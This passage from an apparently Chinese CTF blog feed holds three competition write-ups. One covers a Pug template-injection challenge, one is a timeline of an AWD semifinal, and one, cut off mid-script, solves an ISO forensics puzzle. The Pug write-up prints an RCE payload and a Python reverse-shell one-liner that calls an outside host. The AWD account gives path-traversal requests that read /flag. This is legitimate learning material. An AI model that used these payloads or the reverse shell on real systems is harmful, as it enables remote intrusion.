class="token attr-value"><span class="token string">"./images/1.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">纸飞机</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/2.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">人</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/3.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">小火车</span>      <span class="token tag">div</span> <span class="token plain-text">个性签名</span>        <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"diy"</span> value<span class="token operator">=</span><span class="token string">"尊贵的admin可以在这更改个性签名"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"submit"</span></span><span class="token punctuation">)</span></span></span>    <span class="token tag">div</span> <span class="token plain-text">&lt;img src='#&#123;png&#125;'></span>    <span class="token mixin"><span class="token name function">+hello</span><span class="token punctuation">(</span><span class="token string">"哈喽"</span><span class="token punctuation">)</span></span>    <span class="token mixin"><span class="token name function">+printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre><p>而pug这里存在命令执行漏洞，原因在pug模版引擎的一个<a href="https://github.com/pugjs/pug/issues/3312">issue</a>中提到的</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>p<span class="token operator">=</span><span class="token single-quoted-string string">');process.mainModule.constructor._load('</span>child_process<span class="token single-quoted-string string">').exec('</span>whoami<span class="token single-quoted-string string">');_=('</span></code></pre><p>反思：exec是不回显的！一直让我以为是我打的方式不对…</p><p>既然没回显那试一下发现是通外网的，就弹个shell回来。这算是个注入，一打整个界面变得惨不忍睹</p><img src="/article/2021dfjk/image-20210803153836972.png" class="" title="image-20210803153836972" loading="lazy"><p>普通的弹shell命令似乎并不管用，直接干它 用python命令弹shell</p><img src="/article/2021dfjk/image-20210803153955025.png" class="" title="image-20210803153955025" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?p&#x3D;&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&#39;&#x2F;bin&#x2F;bash\&#39;,\&#39;-i\&#39;]);&quot;&#39;);_&#x3D;(&#39;</code></pre><p>成功弹到shell，获得flag</p><img src="/article/2021dfjk/image-20210803154137511.png" class="" title="image-20210803154137511" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>巅峰fw就是我了，做题经验还是不足，对于原型链污染这一块的知识经过这一次比赛的检测发现还是有所欠缺，抓紧总结巩固一下js原型链污染的知识点吧。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1426/">Seebug express-validator 6.6.0 原型链污染分析</a></p><p><a href="https://github.com/pugjs/pug/issues/3312">pug模版引擎issue</a></p><p><a href="https://www.mrkaixin.top/">@Mrkaixin师傅</a> 非常感谢Mrkaixin师傅的指导</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021ciscn华东北半决赛</title>
      <link href="article/2021ciscnawd/"/>
      <url>article/2021ciscnawd/</url>
      
        <content type="html"><![CDATA[<p>第一次打正式的国赛半决赛awd，复盘总结，分析与反思</p><a id="more"></a><h2 id="队伍名称：S3C-2021"><a href="#队伍名称：S3C-2021" class="headerlink" title="队伍名称：S3C_2021"></a>队伍名称：S3C_2021</h2><p>第31名</p><p>止步于此，虽不荣耀，但仅以此鞭策自己。为自己，为团队，为后继的学弟学妹们记录。</p><p>至暗时刻，虽不愿承认，本工作室打出了历史辉煌后最差的一次成绩</p><p>本人很自责，没能跟随师傅们的步伐前进，拖队伍后腿止步于半决赛</p><p>在此复盘总结</p><hr><h2 id="比赛时间：2021年6月19日-9-00-18-30"><a href="#比赛时间：2021年6月19日-9-00-18-30" class="headerlink" title="比赛时间：2021年6月19日 9:00-18:30"></a>比赛时间：2021年6月19日 9:00-18:30</h2><p>按照<code>时间：- 事件</code>格式进行完整复盘，以本人角度对赛况进行分析</p><h3 id="时间：比赛前-赛前准备"><a href="#时间：比赛前-赛前准备" class="headerlink" title="时间：比赛前 - 赛前准备"></a>时间：比赛前 - 赛前准备</h3><p>准备好了完备的awd不死码批量上传激活脚本，提交flag脚本，以及各类log日志及分析工具，按照去年情况，题目是web多pwn少，对于web做好了充分的准备，awd前期速度取胜，如果有简单后门就可以直接利用，达到全程拿分的目的。</p><p>本队三位web师傅一位pwn师傅</p><h3 id="时间：比赛时-赛况"><a href="#时间：比赛时-赛况" class="headerlink" title="时间：比赛时 - 赛况"></a>时间：比赛时 - 赛况</h3><h4 id="8-30左右-未开赛"><a href="#8-30左右-未开赛" class="headerlink" title="8:30左右 - 未开赛"></a>8:30左右 - 未开赛</h4><p>准备好设备，我带了两台电脑，一台电脑插上网线，开wifi，另一台电脑连接。由于m1的arm架构问题，有些事情不得不在windows上做，比如D盾扫描之类的，为防止纠纷我两台电脑都进行了录屏。</p><h4 id="9-00-第1轮"><a href="#9-00-第1轮" class="headerlink" title="9:00 - 第1轮"></a>9:00 - 第1轮</h4><p>开始比赛，靶机全部用ssh私钥连接，不存在篡改密码的情况。</p><p>第一批2道web两道pwn。以ip标号命名，<code>11/12</code> 是web，<code>13/15</code>是pwn</p><img src="/article/2021ciscnawd/image-20210620165959278.png" class="" title="image-20210620165959278" loading="lazy"><p>从左到右依次是11-17</p><p>上来我们三位web师傅首先下载ssh</p><pre class="language-none"><code class="language-none">safecms --&gt; 172.35.xx.11:80,eyou --&gt; 172.35.xx.12:80,decoder --&gt; 172.35.xx.13:9999,cryptopark --&gt; 172.35.xx.14:9999,eval --&gt; 172.35.xx.15:9999,secgame --&gt; 172.35.xx.16:9999,lol --&gt; 172.35.xx.17:80</code></pre><img src="/article/2021ciscnawd/image-20210620173025274.png" class="" title="image-20210620173025274" loading="lazy"><p>一看就是3web，4pwn。导入密钥后发现怎么都连不上，过了一段时间，主办方通知 有些靶机没有启动成功，正在启动，有问题举手示意。离谱的是，大家都没连上，某学校第一轮已经发现漏洞并写好脚本打了全场的分，独占鳌头。</p><p>第一轮由于靶机未启动成功，所以check down了，无语。</p><img src="/article/2021ciscnawd/image-20210620210522286.png" class="" title="image-20210620210522286" loading="lazy"><h4 id="9-10-第2轮-直接进攻"><a href="#9-10-第2轮-直接进攻" class="headerlink" title="9:10 - 第2轮 - 直接进攻"></a>9:10 - 第2轮 - 直接进攻</h4><p>旁边web师傅连接成功，上去后首先挂了log和文件监控，然后拖下来源码开始扫。</p><img src="/article/2021ciscnawd/upload_df544a9bb4d1a8a99073e4f878056ce0.png" class="" title="img" loading="lazy"><p>直接发现文件包含漏洞，如下</p><img src="/article/2021ciscnawd/image-20210620190953385.png" class="" title="image-20210620190953385" loading="lazy"><p>调用show方法，直接可以文件包含<code>/flag</code></p><img src="/article/2021ciscnawd/image-20210620191059855.png" class="" title="image-20210620191059855" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p>开始写脚本全场打，之前预先写好的提交flag脚本针对的是D段的，改成C段浪费了点时间。</p><img src="/article/2021ciscnawd/image-20210620193200148.png" class="" title="image-20210620193200148" loading="lazy"><p>然后直线上分，靠这一步稳步在了第5名。我们将此处调用直接注释，成功防御和check。11被打到了第3轮。</p><p>此时12，13，15还没有人出，我们开始分析源码挖洞。</p><img src="/article/2021ciscnawd/image-20210622155449870.png" class="" title="image-20210622155449870" loading="lazy"><p>上通防的给逮到了吧</p><h4 id="9-30左右-第4-5轮"><a href="#9-30左右-第4-5轮" class="headerlink" title="9:30左右 - 第4-5轮"></a>9:30左右 - 第4-5轮</h4><p>发现我们的服务直接就checkdown了，经确认，发现是waf和套壳的原因，我们下掉了waf和壳</p><img src="/article/2021ciscnawd/image-20210620211053690.png" class="" title="image-20210620211053690" loading="lazy"><p>12被扣20分，15被扣10分</p><h4 id="9-50左右-第6-9轮"><a href="#9-50左右-第6-9轮" class="headerlink" title="9:50左右 - 第6-9轮"></a>9:50左右 - 第6-9轮</h4><img src="/article/2021ciscnawd/image-20210620212448430.png" class="" title="down" loading="lazy"><p>发现12大量宕机，警惕</p><p>第9轮，进到了第三名</p><img src="/article/2021ciscnawd/image-20210620212907416.png" class="" title="image-20210620212907416" loading="lazy"><h4 id="10-30左右-第10轮-pwn题一血"><a href="#10-30左右-第10轮-pwn题一血" class="headerlink" title="10:30左右 - 第10轮 - pwn题一血"></a>10:30左右 - 第10轮 - pwn题一血</h4><img src="/article/2021ciscnawd/image-20210620213129362.png" class="" title="image-20210620213129362" loading="lazy"><p>pwn全场被攻击，开始分析流量</p><img src="/article/2021ciscnawd/image-20210620213518653.png" class="" title="image-20210620213518653" loading="lazy"><p>pwn爷在努力复现</p><p>第11轮，<code>TimeKeeper</code>直接凭借一题上了近700分，打到了第二，我们到了第四</p><img src="/article/2021ciscnawd/image-20210622133401466.png" class="" title="image-20210622133401466" loading="lazy"><p>pwn爷本地套壳尝试，发现本地可以，靶机不行。此时商量对策，由于我们排名较为靠前，为减少差距，我们决定宕机。这样宕机扣10分给全场，被打扣10分给打的人，不如给全场，于是决定自行宕机。</p><img src="/article/2021ciscnawd/image-20210622133745484.png" class="" title="image-20210622133745484" loading="lazy"><p>pwn爷重放失败，觉得是方式问题，我们让他稳住，慢慢检查。</p><h4 id="11-20左右-第15轮"><a href="#11-20左右-第15轮" class="headerlink" title="11:20左右 - 第15轮"></a>11:20左右 - 第15轮</h4><p>13被攻击</p><img src="/article/2021ciscnawd/image-20210622133904810.png" class="" title="image-20210622133904810" loading="lazy"><p>由于部分队伍重放成功，我们掉到了第7。我们鼓励pwn师傅优先重放，暂时不用修。</p><p>同时我帮忙检查了流量</p><img src="/article/2021ciscnawd/image-20210622134327938.png" class="" title="image-20210622134327938" loading="lazy"><p>怀疑是混淆流量，最后证实不需要这么复杂。当时让pwn师傅先保存，优先看15.</p><h4 id="11-40-第17轮-被人关站"><a href="#11-40-第17轮-被人关站" class="headerlink" title="11:40 - 第17轮 - 被人关站"></a>11:40 - 第17轮 - 被人关站</h4><p>（主办方送饭来了）</p><p>突发状况，web2大量宕机。发现网站被人关闭了。经主办方提醒，web2有后台管理，密码默认，被人批量改了密码登陆后台关闭了网站。网站显示<code>网站暂时关闭，维护中……</code></p><p>黑，真tm的黑啊。</p><p>还好网站有备份，尝试复原，发现无法复原，没有权限。</p><p>但是数据库还在，尝试修改数据库里的admin密码，发现是md5，生成后发现不对，密码应该是加盐了</p><p><strong>各方尝试后，在11:45左右，我们向主办方申请了重置靶机12。</strong></p><p>重置完成后立刻登陆，可是人家写好了批量攻击脚本，我们没人家快</p><img src="/article/2021ciscnawd/image-20210622135940583.png" class="" title="image-20210622135940583" loading="lazy"><p>这时候突发奇想，搜索源码</p><img src="/article/2021ciscnawd/image-20210622140242016.png" class="" title="image-20210622140242016" loading="lazy"><p>既然这有判断，那就干脆全部注释，或者把<code>0</code>改成<code>1</code></p><img src="/article/2021ciscnawd/image-20210622140326152.png" class="" title="image-20210622140326152" loading="lazy"><p>网站恢复了，但这次处理耗费了大量时间，我们已经开始乱了阵脚</p><p>此时pwn师傅那决定13也自行宕机。</p><h4 id="12-00-第19轮-修复12"><a href="#12-00-第19轮-修复12" class="headerlink" title="12:00 - 第19轮 - 修复12"></a>12:00 - 第19轮 - 修复12</h4><p>危机还未解除，我们发现12还是checkdown的状态</p><p>同时12点上了新题，刷新发现，上了两道pwn题，pwn师傅直接瘫倒在了椅子上，我们三个web心里凉了一截，已经认定本次比赛我们基本上已经输了。（此时要是上1web1pwn也许还有机会，可是上了2pwn题）</p><p>pwn师傅此时发现不会重放流量，意味着我们pwn题没有输出了，同时尝试修复，发现修复就checkdown，意味着我们现在2web4pwn，4pwn完全就是送分的状态，基本上结局已定。</p><p>11/12为web，13/15为pwn，14/16为新上的pwn</p><img src="/article/2021ciscnawd/image-20210622142809731.png" class="" title="image-20210622142809731" loading="lazy"><p>我们让pwn师傅稳住，不管结果如何我们一起接受，此时大家都心知肚明，可是没人敢点破…</p><p><strong>即使注定失败，我们也得战到最后</strong></p><p>目前web任务：修复好12</p><p>我去审计代码</p><img src="/article/2021ciscnawd/image-20210620174753069.png" class="" title="image-20210620174753069" loading="lazy"><p>找到了Admin后台路由为<code>/Admin/login</code>（其实审流量能看到，可是被人打了混淆太恶心了）</p><img src="/article/2021ciscnawd/image-20210622141935947.png" class="" title="image-20210622141935947" loading="lazy"><p>在<code>application/admin/controller/Admin.php</code>下发现验证方式</p><img src="/article/2021ciscnawd/image-20210622142119360.png" class="" title="image-20210622142119360" loading="lazy"><p>跟进<code>func_encrypt</code>看，发现确实加盐了，现在要找到位置，继续跟进</p><img src="/article/2021ciscnawd/image-20210622142205443.png" class="" title="image-20210622142205443" loading="lazy"><p>发现应该存在数据库中，幸亏数据库未被改密码</p><img src="/article/2021ciscnawd/image-20210622142403373.png" class="" title="image-20210622142403373" loading="lazy"><p>在数据库中找到盐</p><img src="/article/2021ciscnawd/image-20210622142613420.png" class="" title="image-20210622142613420" loading="lazy"><p>update一下admin的密码，成功修改成功，把网站恢复正常了。</p><img src="/article/2021ciscnawd/image-20210622155405384.png" class="" title="image-20210622155405384" loading="lazy"><h4 id="12-20-第21轮"><a href="#12-20-第21轮" class="headerlink" title="12:20 - 第21轮"></a>12:20 - 第21轮</h4><p>我们掉到了17名</p><p>此时新上的14直接被人a掉了，不过是试探性的打了两个队，下一轮就要全场打了</p><img src="/article/2021ciscnawd/image-20210622143135148.png" class="" title="image-20210622143135148" loading="lazy"><img src="/article/2021ciscnawd/image-20210622143251871.png" class="" title="image-20210622143251871" loading="lazy"><h4 id="13-00-第25轮"><a href="#13-00-第25轮" class="headerlink" title="13:00 - 第25轮"></a>13:00 - 第25轮</h4><p>（主办方提示饭凉了，我们还没动过旁边的饭）</p><p>此时掉到了26名</p><p>我审计14的流量，发现流量很简单，没有地址特殊字符等等</p><img src="/article/2021ciscnawd/image-20210622143728983.png" class="" title="image-20210622143728983" loading="lazy"><p>我叫pwn师傅先看这题，此时pwn师傅神情恍惚</p><h4 id="14-00-第31轮"><a href="#14-00-第31轮" class="headerlink" title="14:00 - 第31轮"></a>14:00 - 第31轮</h4><p>此时16被人解出，我们掉到了30名</p><img src="/article/2021ciscnawd/image-20210622144130081.png" class="" title="image-20210622144130081" loading="lazy"><p>pwn师傅尝试修复14，被checkdown并被攻击</p><h4 id="14-20-第33轮-pwn重放成功"><a href="#14-20-第33轮-pwn重放成功" class="headerlink" title="14:20 - 第33轮 - pwn重放成功"></a>14:20 - 第33轮 - pwn重放成功</h4><p>pwn师傅重放14成功！</p><img src="/article/2021ciscnawd/image-20210622144406529.png" class="" title="image-20210622144406529" loading="lazy"><p>开始准备批量打，这时发现批量打脚本有问题，无法结束连接。无奈最后我们全部手交14的flag一直交到比赛结束，中间遗漏了不少</p><h4 id="15-00-第37轮-新题上场"><a href="#15-00-第37轮-新题上场" class="headerlink" title="15:00 - 第37轮 - 新题上场"></a>15:00 - 第37轮 - 新题上场</h4><img src="/article/2021ciscnawd/image-20210622145507276.png" class="" title="image-20210622145507276" loading="lazy"><p>11,12全down了，16pwn师傅还是自行宕机</p><p>此时上了新题，一道简单web，我们决定努力一下</p><p>直接发现文件包含漏洞</p><p><code>./statics/1.php?file=/flag</code></p><p>里面是个file_get_contents，直接删除，我立刻写脚本开始全场打</p><img src="/article/2021ciscnawd/image-20210622151547266.png" class="" title="image-20210622151547266" loading="lazy"><p>题目刚上来一轮就攻击成功，也有其他队发现了漏洞，和我们平分了分数</p><img src="/article/2021ciscnawd/image-20210622151717676.png" class="" title="image-20210622151717676" loading="lazy"><p>这一波的反应极其迅速，可是还是无法弥补前面的差距。但我们不想放弃。</p><p>决定一位web师傅继续审计17，另外的师傅修11/12，我继续审计流量。</p><h4 id="15-20-第39轮-再出一洞"><a href="#15-20-第39轮-再出一洞" class="headerlink" title="15:20 - 第39轮 - 再出一洞"></a>15:20 - 第39轮 - 再出一洞</h4><p>审计发现了17第二个洞如下</p><p><code>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</code></p><p>与11模版相似，直接写脚本再打</p><img src="/article/2021ciscnawd/image-20210622152502255.png" class="" title="image-20210622152502255" loading="lazy"><p>修复方法直接注释</p><h4 id="15-50-第42轮-针对check"><a href="#15-50-第42轮-针对check" class="headerlink" title="15:50 - 第42轮 - 针对check"></a>15:50 - 第42轮 - 针对check</h4><p>12网站正常却checkdown，发现数据库给人删了，听说是sql注入手注给人删了库，我们仅剩一次重置机会，况且11现在还在宕机找不到原因。</p><p>队里师傅灵机一动开始分析，我们发现check流量是登陆随机用户，用户名密码都是错的，验证码不可能智能到分析验证码吧</p><p>来自10.10.10.10的check流量</p><img src="/article/2021ciscnawd/image-20210622153217583.png" class="" title="image-20210622153217583" loading="lazy"><p>现在登陆会显示数据库错误，那就全局搜索，把<code>数据库错误</code>改成了<code>验证码错误</code></p><img src="/article/2021ciscnawd/image-20210622154205778.png" class="" title="image-20210622154205778" loading="lazy"><h4 id="16-00-第43轮"><a href="#16-00-第43轮" class="headerlink" title="16:00 - 第43轮"></a>16:00 - 第43轮</h4><p>pwn师傅尝试修复14被checkdown并被攻击</p><p>11经确认被人写码了，占用资源疯狂写缓存</p><img src="/article/2021ciscnawd/image-20210622154547731.png" class="" title="image-20210622154547731" loading="lazy"><p>实在是不知道怎么办，如果重置的话又会被打。</p><p>pwn师傅说他累了，手 交 要洗内了</p><h4 id="16-30-第46轮-新的0day"><a href="#16-30-第46轮-新的0day" class="headerlink" title="16:30 - 第46轮 - 新的0day"></a>16:30 - 第46轮 - 新的0day</h4><p>12突然报又被打了，立刻查流量</p> <img src="/article/2021ciscnawd/image-20210622155218748.png" class="" title="image-20210622155218748" loading="lazy"><p>然后一刷新主页发现flag就在主页</p><p>咱们就也写，复现成功</p><img src="/article/2021ciscnawd/image-20210622155711588.png" class="" title="image-20210622155711588" loading="lazy"><p>最后一句话没写进去，不知道为啥</p><p>修复就再编辑下把自己的主页恢复就行。前端rce，收获0day一个</p><p>第47轮惨状留念</p><img src="/article/2021ciscnawd/image-20210622154927603.png" class="" title="image-20210622154927603" loading="lazy"><h4 id="17-00-第49轮"><a href="#17-00-第49轮" class="headerlink" title="17:00 - 第49轮"></a>17:00 - 第49轮</h4><img src="/article/2021ciscnawd/image-20210622160146600.png" class="" title="image-20210622160146600" loading="lazy"><p>pwn师傅说他真的累了，给pwn师傅写了个一键提交，让他稍微轻松一点</p><img src="/article/2021ciscnawd/image-20210622160205845.png" class="" title="image-20210622160205845" loading="lazy"><h4 id="17-30-第52轮-复原pwn题"><a href="#17-30-第52轮-复原pwn题" class="headerlink" title="17:30 - 第52轮 - 复原pwn题"></a>17:30 - 第52轮 - 复原pwn题</h4><p>比赛还剩一个小时，pwn师傅将pwn题全部复原了</p><img src="/article/2021ciscnawd/image-20210622161135972.png" class="" title="image-20210622161135972" loading="lazy"><p>11不准备修了，不准备重置了，躺平了。</p><p>咱开了31个shell帮pwn师傅一起交flag</p><img src="/article/2021ciscnawd/image-20210622162019446.png" class="" title="image-20210622162019446" loading="lazy"><h4 id="18-10-第56轮"><a href="#18-10-第56轮" class="headerlink" title="18:10 - 第56轮"></a>18:10 - 第56轮</h4><img src="/article/2021ciscnawd/image-20210622161728291.png" class="" title="image-20210622161728291" loading="lazy"><p>咱17从3:00刚上到最后没被打一次，而且刚上就一直在打别人，算是小小的欣慰吧。</p><h4 id="18-30-第57轮-比赛结束"><a href="#18-30-第57轮-比赛结束" class="headerlink" title="18:30 - 第57轮 - 比赛结束"></a>18:30 - 第57轮 - 比赛结束</h4><p>最终记录</p><img src="/article/2021ciscnawd/BDD377D32C18C9C712D72741E9A5A11A.jpg" class="" title="BDD377D32C18C9C712D72741E9A5A11A" loading="lazy"><p>饭都凉了，一天没吃东西</p><hr><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结束后合照都没有，我们2只队直接离开了赛场。</p><p>这是5位大三师傅们最后一次比赛了可能。</p><p>大二我是web，两位是pwn，一位准备考研去不想打ctf了，另一位很自责</p><p>那位pwn师傅回校后2小时复现了全部的题，自动化提交flag脚本注释掉一行就好了</p><p>他现在非常非常自责</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实并不是pwn师傅一个人的责任，我们团队的问题还是很大。</p><p>3web1pwn的配置就把重担压在了pwn师傅身上</p><p>这次比赛说实话题目下发时间有点不合理</p><p>开赛2web2pwn，12:00竟上了2pwn，15:00上了1web</p><p>说实话就算12:00上1web1pwn，即web多3小时，pwn少3小时。咱们还是有机会的</p><p>当然咱不能怪主办方问题，咱们自身pwn薄弱是根本问题</p><hr><h2 id="对于下届的想法"><a href="#对于下届的想法" class="headerlink" title="对于下届的想法"></a>对于下届的想法</h2><p>觉得咱们对于新人的培养出现了问题，工作室的作风慵懒。</p><p>对于我们这届，进入后没有再次考核，8位师傅有的根本就不再学习技术了</p><p>排除走文艺路线，非技术路线，我们平时的技术提升全靠自己自觉</p><p>对于20届，我们应该除了注重自身的技术成长，也要关注学弟学妹们的培养</p><p>我们工作室已经有断代的迹象了，这次比赛体现了出来，明年可能会更加严重</p><p>咱希望就算从头做起，也不希望辜负前面师傅们打下的基石</p><p>就这样吧</p><p>2021年6月22日</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021强网杯</title>
      <link href="article/2021qwb/"/>
      <url>article/2021qwb/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="一、战队信息："><a href="#一、战队信息：" class="headerlink" title="一、战队信息："></a>一、战队信息：</h1><p>战队名称：我是菜鸡QAQ</p><p>战队排名：68名</p><h1 id="二、解题情况-："><a href="#二、解题情况-：" class="headerlink" title="二、解题情况 ："></a>二、解题情况 ：</h1><img src="/article/2021qwb/image.png" class="" title="image" loading="lazy"><h1 id="三、解题过程："><a href="#三、解题过程：" class="headerlink" title="三、解题过程："></a>三、解题过程：</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="ISO1995-SOLVED-｜-D0gekong"><a href="#ISO1995-SOLVED-｜-D0gekong" class="headerlink" title="ISO1995 | SOLVED ｜ D0gekong"></a>ISO1995 | SOLVED ｜ D0gekong</h2><p>拿到文件放进kail用file可以看出是一个debian的磁盘文件，用binwalk可以分离出一个iso文件，用ultraiso打开iso文件，将里面的文件提取出来</p><p>提取出来可发现每个文件都是一个字节的文本</p><img src="/article/2021qwb/thumbnail.png" class="" title="thumbnail" loading="lazy"><p>用batch批处理命令拼接可得到以下文本</p><pre class="language-none"><code class="language-none">!&#x3D;gF~B.@YBO1.%DYzbA-1]&#125;jH&amp;@ ,K[7t&#x2F;LOi*5b)L &#39;&lt;pw&#39;am\W4LH@\toGKE1f &quot;oDWOaf2&#123;1&#123;w_ov-m:af8A044iCT_+ $w3cz(L0O)L_-s8&#39;_&lt;Ic &#x2F;KFP9vrr~6\ni&#123;~#g5cs#7z2S++Y1BbYQV&#39;is1&#x3D;DZ_| 3T1QxWEwX]&#125;NS@_3SdKK]91b?s-rs6g0QwBs @4#5TGxw#&amp;4ArDw~_X&quot;!._IAo&#96;&#39;xso&#39;.s5)+c9RU&#39; &#x2F;%_b[rjioPOy!&amp;&#x2F;)wjKR#工jih0&#39;\,Dr! &amp;PHNf%, YOWEJ(2wXj&#x2F;u~1@gh%&amp;_6z5U~A&#x3D;OpAV$E&#x2F; &gt;1Kg:@4tS:V4ZB&#96;1_x*.17B&amp;:&lt;XnOrw| 2TY_DSN&lt;zvbKCj7+6w&#39;r&#125;Lo8&#39;:fYC@Fv102vbo)noQ1MT3#AZ+]U3##P|w&#123;V&gt;z,G5[s r&#x2F;Ra~p&#39;&gt;o0Y]&#123;0&#123;8&quot;oh&#x3D;vG*S82KoNt17|,*r#d!&#x3D;N&#39;%0$1Tron:7&#125;6c(yVSIZmtw8xza]6D ,nn*q&amp;KHNK,PW .b&lt;h E$)&#123;Kw_)h ,&#x3D;m41LAv&#39;f61:T xN:4z0&#123;&gt;&amp;F5(cRg| :M9RVX$,8&#x2F;1vq-][?a&#x2F;H)1&quot;x; ((,NZ(&#x3D;wJ4o&lt;&#x2F;_8.D9Q8~t&quot;aA:RNTXpSC8LKW+Pfgw&lt;NTqmy_8G6Np%c-9tAG-em&amp;]1IYtz\12a1KD&amp;z&lt;k &#39;w7HFr--py2uH&#x3D;;37*iuisp39+m ;&quot;1:xPJBC*LB8;x*?G. &#39; &#96;nA[PibSKN&gt;RFG#vDrw7k@QcOebUkG,~fvtxH [w&lt;f:e]mcbx,Yi6KcZ~八VHLR,t&#123;F&#x3D;&#125;gTKX&amp;;A_Fv1b,DeZJ1N]6q)76a]Us&#x3D;\u8tY;t*#]zSGo~-h64&#x3D;u2bGZ)1(&amp;%K68a!nQke&amp;+gX&#x3D;L4TmMy$5nHC&amp;+#&lt;486HKF4f0d%1?I:1&#x3D;M[p~DXELtCKh\&gt;4&lt;Qf+cj?a3pOF~4*-9%7*&lt;~&#39; +KkQ&lt;*z9oUgrgo$:NC.Di&lt;.$&#96;s+69Pn7:TgO~A\TKn |Q&#39;G&amp;9TX-@!6w&lt;VK_5tH&#x2F;#i&gt;$7SKKH[Dki-o&#123;b&#123;?j?4.ZW+aV! |zi&#123;2oTqk*#! o0h$-6oCbPpazbPfi</code></pre><p>然后把iso放进010里，搜索FFFF,发现FFFF后面的两字节每个都不一样猜测有蹊跷，用脚本提取出来</p><p>脚本附上：</p><pre class="language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"iso1995.iso"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\xff\xff\xff\xff"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        temp <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>index<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        result <span class="token operator">+=</span> temp        data <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">import</span> structbase <span class="token operator">=</span> <span class="token string">"iso1995/flag_f"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token 